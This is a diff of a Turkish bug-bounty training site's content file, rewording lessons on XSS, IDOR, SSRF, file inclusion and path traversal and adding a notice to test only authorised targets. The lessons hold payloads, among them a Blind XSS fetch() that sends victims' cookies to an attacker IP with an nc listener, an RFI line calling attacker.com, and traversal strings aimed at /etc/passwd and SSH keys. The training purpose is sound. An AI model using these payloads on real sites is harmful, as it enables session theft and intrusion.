@@ -704,7 +704,7 @@
         home: {
           type: 'home',
           title: 'Bug Bounty Akademi',
-          subtitle: 'Sıfırdan ileri seviyeye kapsamlı bug bounty eğitimi. Gerçek dünya senaryoları, pratik araçlar ve adım adım metodolojiler ile zafiyet avcısı olun.'
+          subtitle: 'Sıfırdan ileri seviyeye kapsamlı bug bounty eğitimi. Gerçek dünya senaryoları, pratik araçlar ve adım adım metodolojiler ile zafiyet avcısı olun.<br>Eğitim amaçlı içeriktir. Yalnızca yetkiniz olan hedeflerde test yapın.'
         },
         baslangic: {
         menuName: 'Giriş',
@@ -865,118 +865,89 @@
       }
     ]
   },
-        xss: {
-          menuName: 'XSS',
-          icon: 'icon-code',
-          parent: 'vulnerabilities',
-          title: 'XSS - Cross Site Scripting',
-          description: 'Reflected, Stored, DOM XSS için kısa metodoloji.',
-          sections: [
-            {
-              title: 'Reflected XSS',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Browserda JS kodu calistirilarak ortaya cikan acik turu. Inputlarda, URL Querylerde denenebilir.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">x.com/test/test123?testparam=test123' → Sayfa kaynagini goruntule → CTRL + F → test123 {Payload encode ediliyor mu?}</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">&lt;meta ... x.com/test/test1234%2522"/>  → Encode etmeseydi /> diyerek tagi kapatir ve kendi js kodumuzu yazabilirdik.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Ornek Payload: &lt;img src=a onerror=alert("hacked")></li>
-                </ul>
-              `
-            },
-            {
-              title: 'Stored XSS',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Sayfaya giren herkesi etkileyen xss turu.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Girdi(input) olan her yerde denenebilir.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</li>
-                </ul>
-              `
-            },
-            {
-              title: 'DOM XSS',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    Tarayıcı tarafında, JS ile kullanıcı kontrollü verinin (location/hash, search, localStorage, referrer) DOM'a tehlikeli şekilde yerleştirilmesiyle oluşur.
-                  </li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    Sık görülen tehlikeli fonksiyonlar: <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>insertAdjacentHTML</code>.
-                  </li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    Hızlı test: sayfada hash/search'i doğrudan yazan bir yer var mı? Örn. <code>el.textContent = location.hash.substring(1)</code> güvenlidir; <code>innerHTML</code> değil.
-                  </li>
-                </ul>
-              `
-            },
-            {
-              title: 'Blind XSS',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Sayfanin verdigi tepkiye gore bulunan xss turu.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">&quot;&gt;&lt;script src=https://xvt.xss.ht&gt;&lt;/script&gt;<br>Bu kod harici bir JS dosyası çağırıyor.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Terminal: nc -nvlp 4040<br>Payload:&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;<br>fetch() ile kullanıcının çerezlerini (document.cookie) Base64 kodlayıp saldırganın server’ına gönderiyor (10.10.198.12:3131).</li>
-                </ul>
-              `
-            },
-          ]
-
-
-
-
-
-
-
+xss: {
+    menuName: 'XSS',
+    icon: 'icon-code',
+    parent: 'vulnerabilities',
+    title: 'XSS - Cross Site Scripting',
+    description: 'Reflected, Stored, DOM ve Blind XSS türleri için kısa metodoloji.',
+    sections: [
+        {
+            title: 'Reflected XSS',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tarayıcıda JavaScript kodu çalıştırılarak ortaya çıkan zafiyet türüdür. Girdi alanlarında ve URL parametrelerinde denenebilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>example.com/search?q=test'</code> → Sayfa kaynağını görüntüle (CTRL+U) → 'test' kelimesini arat. Payload sunucu tarafından encode ediliyor mu kontrol et.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Eğer girdi encode edilmiyorsa, <code>"/></code> gibi karakterlerle mevcut HTML etiketini kapatıp kendi script kodumuzu enjekte edebiliriz.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Örnek Payload: <code>&lt;img src=x onerror=alert("XSS")&gt;</code></li>
+            </ul>`
         },
-        idor: {
-          menuName: 'IDOR',
-          icon: 'icon-key',
-          parent: 'vulnerabilities',
-          title: 'IDOR - Insecure Direct Object Reference',
-          description: 'IDOR testleri, access control mantığı.',
-          sections: [
-            {
-              title: 'Metodoloji',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Erisimin olmamasi gereken herhangi bir seye erisebilme durumuna sebep olan guvenlik acigi.<br>Istek turu degistirilerek de denenebilir → GET, POST, DELETE ...</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">GET /api/getUserInfo?id=245 HTTP /2 → Kendi verimiz.<br>GET /api/getUserInfo?id=246 HTTP /2 → ID'si 246 olan kisinin verisi.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">https://onlinestore.thm/order/1234/invoice → Kendi Faturamiz<br>https://onlinestore.thm/order/1000/invoice → 1000 Numarali Fatura</li>
-                </ul>
-              `
-            },
-            {
-              title: 'Ornekler',
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Base64 ile encode edilmis bir id: ?user_id=1305 → ?user_id=MTMwNQ==</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">MD5 ile Hashlenmis bir id: ID: 123 → MD5(ID): 202cb962ac59075b964b07152d234b70</li>
-                </ul>
-              `
-            },
-            {
-              title: "Tahmin Edilemez IDler",
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Bazen geliştirici işi zorlaştırıyor ve ID’yi rastgele / karmaşık yapıyor.<br>Bunu brute force ya da decode etmen imkansıza yakin.</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">İki farklı hesap oluştur. (örneğin senin hesabın + sahte hesap)<br>Hesap 1 → user_id = abc123<br>Hesap 2 → user_id = xkq992</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Kendi hesabınla giriş yap → Bilgini görüntüle (örneğin /profile?id=abc123).<br>Şimdi URL’deki ID’yi değiştir → /profile?id=xkq992</li>
-                </ul>
-              `
-            },
-            {
-              title: "Nerede Bulunur?",
-              content: `
-                <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">1-Adres Çubuğunda (URL’de) → /profile?user_id=123</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">2-AJAX / API Çağrılarında (Background Requests) → GET /api/v1/user/details</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">3-JavaScript Dosyalarında → fetch("/user/details?user_id=" + uid)</li>
-                  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">4-Hidden / Geliştirme Parametreleri (Parameter Mining)<br>/user/details → {kendi bilgini gösterir.}<br>/user/details?user_id=123 → {başka kullanici bilgisini gosterir.!}</li>
-                </ul>
-              `
-            }
-          ]
+        {
+            title: 'Stored XSS',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Sayfayı ziyaret eden herkesi etkileyen kalıcı XSS türüdür.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Kullanıcıdan girdi alınan (yorum, profil bilgisi, mesaj vb.) ve veritabanına kaydedilen her yerde denenebilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Örnek Payload: <code>&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</code></li>
+            </ul>`
         },
+        {
+            title: 'DOM XSS',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tarayıcı tarafında, JavaScript ile kullanıcıdan gelen verinin (URL hash, search, localStorage vb.) DOM'a güvenli olmayan bir şekilde yazdırılmasıyla oluşur.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tehlikeli fonksiyonlar (sink): <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>insertAdjacentHTML</code>.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı test: URL'deki hash (#) veya query (?) parametresini değiştirin. Eğer bu değer sayfada bir yere yazılıyorsa, kaynak kodunu inceleyerek hangi fonksiyonun kullanıldığını kontrol edin. <code>textContent</code> güvenli iken <code>innerHTML</code> tehlikelidir.</li>
+            </ul>`
+        },
+        {
+            title: 'Blind XSS',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code><br>Bu kod, tetiklendiğinde size bildirim gönderen harici bir JS dosyası çağırır.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Terminal: <code>nc -nvlp 4040</code><br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code><br>Bu payload, tetiklendiği kullanıcının çerezlerini Base64 ile kodlayıp saldırganın sunucusuna gönderir.</li>
+            </ul>`
+        }
+    ]
+},
+idor: {
+    menuName: 'IDOR',
+    icon: 'icon-key',
+    parent: 'vulnerabilities',
+    title: 'IDOR - Insecure Direct Object Reference',
+    description: 'IDOR test metodolojisi ve yetki kontrolü atlatma senaryoları.',
+    sections: [
+        {
+            title: 'Metodoloji',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Erişim yetkisi olmaması gereken bir nesneye veya veriye doğrudan referans vererek (genellikle ID değiştirerek) erişilebilmesidir.<br>İstek türü (GET, POST, DELETE vb.) değiştirilerek de test edilebilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>GET /api/getUserInfo?id=245</code> → Sizin veriniz.<br><code>GET /api/getUserInfo?id=246</code> → ID'si 246 olan başka bir kullanıcının verisi.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>https://onlinestore.thm/order/1234/invoice</code> → Sizin faturanız.<br><code>https://onlinestore.thm/order/1000/invoice</code> → 1000 numaralı başka bir fatura.</li>
+            </ul>`
+        },
+        {
+            title: 'Örnekler',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Base64 ile encode edilmiş ID: <code>?user_id=1305</code> → <code>?user_id=MTMwNQ==</code></li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">MD5 ile Hash'lenmiş ID: ID: 123 → MD5(ID): <code>202cb962ac59075b964b07152d234b70</code></li>
+            </ul>`
+        },
+        {
+            title: "Tahmin Edilemez ID'ler",
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Bazen ID'ler sıralı sayılar yerine karmaşık (UUID vb.) olabilir. Bu ID'leri tahmin etmek veya kırmak neredeyse imkansızdır.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Çözüm: İki farklı hesap oluşturun (Hesap A ve Hesap B).<br>Hesap A → <code>user_id = abc-123-xyz</code><br>Hesap B → <code>user_id = def-456-uvw</code></li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hesap A ile giriş yapın ve profilinize gidin: <code>/profile?id=abc-123-xyz</code>.<br>Şimdi URL'deki ID'yi Hesap B'nin ID'si ile değiştirin: <code>/profile?id=def-456-uvw</code>. Eğer Hesap B'nin bilgilerini görebiliyorsanız, IDOR zafiyeti mevcuttur.</li>
+            </ul>`
+        },
+        {
+            title: "Nerede Aranır?",
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">1- Adres Çubuğunda (URL): <code>/profile?user_id=123</code></li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">2- AJAX/API İstekleri: Burp Suite gibi araçlarla arka planda çalışan <code>GET /api/v1/user/details</code> gibi istekleri izleyin.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">3- JavaScript Dosyaları: Kaynak kodda <code>fetch("/user/details?user_id=" + uid)</code> gibi dinamik istekler arayın.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">4- Gizli Parametreler (Parameter Mining): <code>/user/details</code> (kendi bilginizi gösterir) isteğine <code>?user_id=123</code> ekleyerek başka bir kullanıcının bilgisini göstermeyi deneyin.</li>
+            </ul>`
+        }
+    ]
+},
 
 
 
@@ -1038,7 +1009,7 @@
         `
       },
       {
-        title: 'Test Adımları (Pratik Kılavuz)',
+        title: 'Test Adımları',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
@@ -1250,19 +1221,17 @@
     icon: 'icon-globe',
     parent: 'vulnerabilities',
     title: 'SSRF - Server Side Request Forgery',
-    description: 'Sunucunun başkası adına HTTP/URI istekleri yapmasını sağlayarak internal servisleri, metadata ve portları keşfetme / bilgi sızdırma. Normal ve Blind varyantları kısa metodoloji ve PoC içerir.',
+    description: 'Sunucunun, saldırganın belirttiği bir adrese istek yapmasıyla oluşan zafiyettir. İç ağdaki servislere erişim veya bulut metadata sızıntısı gibi kritik sonuçlara yol açabilir.',
     sections: [
+        {
+            title: 'Özet Bilgi',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, kullanıcıdan aldığı bir URL veya path'i sunucu tarafında bir kaynağı çekmek için kullanıyorsa SSRF zafiyeti oluşabilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><b>Normal SSRF:</b> Sunucunun yaptığı isteğin yanıtı saldırgana geri döner. <br><b>Blind (Kör) SSRF:</b> Yanıt dönmez, zafiyetin tespiti için dışarıya bir ağ isteği (callback) gerekir (örn: Burp Collaborator, Interactsh).</li>
+            </ul>`
+        },
       {
-        title: 'Quick TL;DR',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Parametre uygulama tarafından server-side fetch/redirect/forward için kullanılıyorsa SSRF olabilir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Normal: response saldırgana döner. Blind: sadece server istek yapar — callback/log gerekir (BurpCollab/Interactsh).</li>
-          </ul>
-        `
-      },
-      {
-        title: 'Normal SSRF — Hızlı Test & Exploit',
+        title: 'Normal SSRF',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Ne: Sunucu, kontrol ettiğin URL'e GET/POST ile istekte bulunup cevabı gösteriyorsa.</li>
@@ -1273,7 +1242,7 @@
         `
       },
       {
-        title: 'Blind SSRF — Hızlı Test & Exploit',
+        title: 'Blind SSRF',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Ne: Sunucu isteği yapar ama cevap saldırgana dönmez; başarılı test için dışa bağlantı log/ DNS/HTTP callback gerekir.</li>
@@ -1304,7 +1273,7 @@
         `
       },
       {
-        title: 'Kısa Bypass Teknikleri (özlü)',
+        title: 'Kısa Bypass Teknikleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Parametre sonlandırma: <code>?server=http://internal.site.local&x=</code></li>
@@ -1316,7 +1285,7 @@
         `
       },
       {
-        title: 'Deny/Allow List Bypass & Open Redirect (öz)',
+        title: 'Deny/Allow List Bypass & Open Redirect',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Deny list: localhost ve metadata engellenmişse IP formatlar/dns yönlendirme ile atlanabilir.</li>
@@ -1430,24 +1399,22 @@
       ]
   },
 
-  file_inclusion: {
+file_inclusion: {
     menuName: 'File Inclusion',
     icon: 'icon-folder-open',
     parent: 'vulnerabilities',
     title: 'File Inclusion - LFI / RFI / Path Traversal',
-    description: 'LFI (local), RFI (remote) ve path traversal özetleri + hızlı PoC, bypassler ve kritik dosyalar. Kısa, direkt ve exploit odaklı.',
+    description: 'LFI (Yerel Dosya Dahil Etme) ve RFI (Uzak Dosya Dahil Etme) zafiyetleri için PoC, bypass teknikleri ve kritik dosya yolları.',
     sections: [
+        {
+            title: 'Temel Mantık',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, <code>file</code> gibi bir parametreyi sunucu tarafında dosya dahil etmek (include/require) veya okumak için kullanıyorsa, kontrolsüz girdi LFI/RFI zafiyetine yol açar.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><b>LFI:</b> Sunucudaki yerel dosyalar okunur. <br><b>RFI:</b> Uzaktaki bir sunucudan dosya çağrılır (PHP ise Uzaktan Kod Çalıştırma (RCE) riski taşır). <br><b>Path Traversal:</b> <code>../</code> karakterleri ile dizin dışına çıkılır.</li>
+            </ul>`
+        },
       {
-        title: 'Ne / Mantık (TL;DR)',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">file parametresi sunucu tarafında include/require veya file-read için kullanılıyorsa kontrolsüz input → LFI/RFI.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">LFI: Local dosyalar okunur. RFI: Uzaktan dosya çağrılır (PHP ise RCE riski). Path Traversal: ../ ile dizin dışına çıkılır.</li>
-          </ul>
-        `
-      },
-      {
-        title: 'LFI - Hızlı Tespit & PoC',
+        title: 'LFI - Hızlı Tespit',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=userCV.pdf</code> → <code>?file=../../../../etc/passwd</code> dene.</li>
@@ -1457,7 +1424,7 @@
         `
       },
       {
-        title: 'RFI - Hızlı Tespit & PoC',
+        title: 'RFI - Hızlı Tespit',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=http://attacker.com/shell.txt</code> koy → sunucu uzaktaki dosyayı include edip çalıştırıyor mu?</li>
@@ -1467,7 +1434,7 @@
         `
       },
       {
-        title: 'Path Traversal & Bypass Teknikleri (öz ve güçlü)',
+        title: 'Path Traversal & Bypass Teknikleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit: <code>../../../../etc/passwd</code></li>
@@ -1478,7 +1445,7 @@
         `
       },
       {
-        title: 'Önemli Wrapper & Teknikler (ek)',
+        title: 'Önemli Wrapper & Teknikler',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PHP wrappers: <code>php://input</code>, <code>data://text/plain,<?php ...?></code> ile bazı senaryolarda exploit mümkün.</li>
@@ -1488,7 +1455,7 @@
         `
       },
       {
-        title: 'Kritik Dosyalar (hızlı referans)',
+        title: 'Kritik Dosyalar',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Linux: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/root/.ssh/id_rsa</code>, <code>/root/.bash_history</code>, <code>/proc/version</code>, webserver logları (<code>/var/log/apache2/access.log</code>).</li>
@@ -1529,24 +1496,22 @@
       }
     ]
   },
-  directory_traversal: {
+directory_traversal: {
     menuName: 'Directory Traversal',
     icon: 'icon-folder-tree',
     parent: 'vulnerabilities',
     title: 'Directory & Path Traversal',
-    description: 'Dizin gezdirme (../) ile uygulamanın izin dışı dosya/dizinlere eriştirilmesi. Kısa, PoC odaklı ve bypass teknikleri içerir.',
+    description: 'Dizin gezme (../) zafiyeti ile uygulamanın yetki dışı dosya ve dizinlere erişmesi. PoC odaklı bypass teknikleri içerir.',
     sections: [
+        {
+            title: 'Özet Bilgi',
+            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Uygulama, dosya yolu alan bir parametreyi düzgün doğrulamıyor ve filtrelemiyorsa, "../" karakterleri kullanılarak dosya sisteminde yetki dışı dizinlere erişilebilir.</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Etkisi bilgi sızdırmadan, "Log Poisoning" gibi tekniklerle Uzaktan Kod Çalıştırma (RCE) zafiyetine kadar gidebilir.</li>
+            </ul>`
+        },
       {
-        title: 'TL;DR',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Parametre dosya/path alıyorsa ve canonicalization yoksa "../" ile üst dizinlere çıkılarak hassas dosyalar okunabilir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Etkisi: bilgi sızdırma, log poisoning, bazen RCE (include ile birleşirse).</li>
-          </ul>
-        `
-      },
-      {
-        title: 'Hızlı Tespit & PoC',
+        title: 'Hızlı Tespit',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: <code>?file=public.txt</code> → <code>?file=../../../../etc/passwd</code> dene.</li>
@@ -1556,7 +1521,7 @@
         `
       },
       {
-        title: 'Bypass Teknikleri (öz ve kullanışlı)',
+        title: 'Bypass Teknikleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">URL encode: <code>..%2f..%2f..%2fetc/passwd</code></li>
@@ -1586,7 +1551,7 @@
         `
       },
       {
-        title: 'PoC Örnekleri (kısa)',
+        title: 'PoC Örnekleri',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit: <code>/download?f=../../../../etc/passwd</code></li>
@@ -1596,7 +1561,7 @@
         `
       },
       {
-        title: 'Mitigations (kısa & net)',
+        title: 'Mitigations',
         content: `
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Allow-list: sadece izinli dosya isimleri/klasörler kabul edilsin (white-listing).</li>
@@ -2364,7 +2329,7 @@ if(quickLinks) {
                           const suggestion = document.createElement('div');
                           suggestion.classList.add('search-suggestion');
                           suggestion.dataset.page = key;
-                          suggestion.innerHTML = `${item.icon || '📄'} ${item.menuName || item.title}${sectionMatches}`;
+                          suggestion.innerHTML = `${item.menuName || item.title}${sectionMatches}`;
                           suggestionsDiv.appendChild(suggestion);
                       }
                   });
@@ -3577,14 +3542,13 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="chat-messages">
             <p class="chat-welcome-message">Merhaba! Site hakkındaki görüşlerinizi, önerilerinizi veya şikayetlerinizi bu form üzerinden bize iletebilirsiniz.</p>
         </div>
-        <div id="form-area" class="chat-input-area">
-            <form id="ajax-contact-form" action="https://formsubmit.co/turgaykara214@gmail.com" method="POST">
-                <textarea name="message" placeholder="Mesajınız..." rows="10" required></textarea>
-                
-                <input type="text" name="_honey" style="display:none">
-                <input type="hidden" name="_next" value="false"> <button type="submit">Mesajı İlet</button>
-            </form>
-        </div>
+<div id="form-area" class="chat-input-area">
+    <form id="ajax-contact-form" action="https://formspree.io/f/xnnggewz" method="POST">
+        <textarea name="message" placeholder="Mesajınız..." rows="10" required></textarea>
+        <input type="hidden" name="_subject" value="Pentest Library - Yeni İletişim Mesajı!">
+        <button type="submit">Mesajı İlet</button>
+    </form>
+</div>
     </div>
 
     <button id="chat-toggle-btn">
